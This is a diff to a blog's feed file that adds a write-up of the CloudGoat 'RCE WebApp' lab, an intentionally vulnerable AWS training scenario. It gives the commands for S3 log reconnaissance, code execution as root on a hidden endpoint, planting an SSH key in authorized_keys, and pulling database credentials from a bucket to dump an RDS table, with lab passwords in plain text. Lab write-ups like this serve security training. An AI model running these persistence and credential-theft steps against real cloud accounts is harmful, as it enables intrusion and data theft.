@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>CloudGoat - RCE WebApp</title>
+      <link href="/2026/09/18/2026-09-18-rce-web-app/"/>
+      <url>/2026/09/18/2026-09-18-rce-web-app/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CloudGoat-RCE-WebApp"><a href="#CloudGoat-RCE-WebApp" class="headerlink" title="CloudGoat - RCE WebApp"></a>CloudGoat - RCE WebApp</h1><h5 id="Difficulty-HARD"><a href="#Difficulty-HARD" class="headerlink" title="Difficulty: HARD"></a>Difficulty: HARD</h5><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>Listing and pulling the logging bucket with the <code>lara</code> profile:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> --profile lara</span><br><span class="line">aws s3 <span class="built_in">ls</span> s3://cg-logs-s3-bucket-cgidq0qfidvtbb --recursive --profile lara</span><br><span class="line">aws s3 <span class="built_in">cp</span> s3://cg-logs-s3-bucket-cgidq0qfidvtbb . --profile lara</span><br><span class="line"><span class="built_in">cat</span> 555_elasticloadbalancing_us-east-1_app.cg.......log</span><br></pre></td></tr></table></figure><p>The logfile reveals a website and a hidden endpoint:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cg-lb-cgidq0qfidvtbb-217357281.us-east-1.elb.amazonaws.com/mkja1xijqf0abo1h9glg.html</span><br></pre></td></tr></table></figure><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>Confirming code execution on the hidden endpoint:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =&gt; uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>Generating a keypair and dropping the public key into <code>authorized_keys</code> via the RCE, then locating and connecting to the instance:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-public-key&quot;</span> &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">aws ec2 describe-instances --region us-east-1 --profile lara</span><br><span class="line">ssh -i ed25519 ubuntu@&lt;public-ec2-ip&gt;</span><br></pre></td></tr></table></figure><h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><p>Pulling database credentials from a secret bucket:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://cg-secret-s3-bucket-cgidq0qfidvtbb --recursive</span><br><span class="line">aws s3 <span class="built_in">cp</span> s3://cg-secret-s3-bucket-cgidq0qfidvtbb/db.txt .</span><br><span class="line"><span class="built_in">cat</span> db.txt</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database credentials</span><br></pre></td></tr></table></figure><p>Using the credentials to reach the RDS instance:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws rds describe-db-instances</span><br><span class="line">psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidq0qfidvtbb.ce9io8wgur2g.us-east-1.rds.amazonaws.com:5432/cloudgoat</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\dt</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sensitive_information;</span><br></pre></td></tr></table></figure><table><thead><tr><th>name</th><th>value</th></tr></thead><tbody><tr><td>Super-secret-passcode</td><td>V!C70RY-4hy2809gnbv40h8g4b</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> cloud </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> security </tag>
+            
+            <tag> cloudgoat </tag>
+            
+            <tag> aws </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Orion - CTF Writeup</title>
       <link href="/2026/09/08/2026-09-08-orion-htb/"/>
       <url>/2026/09/08/2026-09-08-orion-htb/</url>
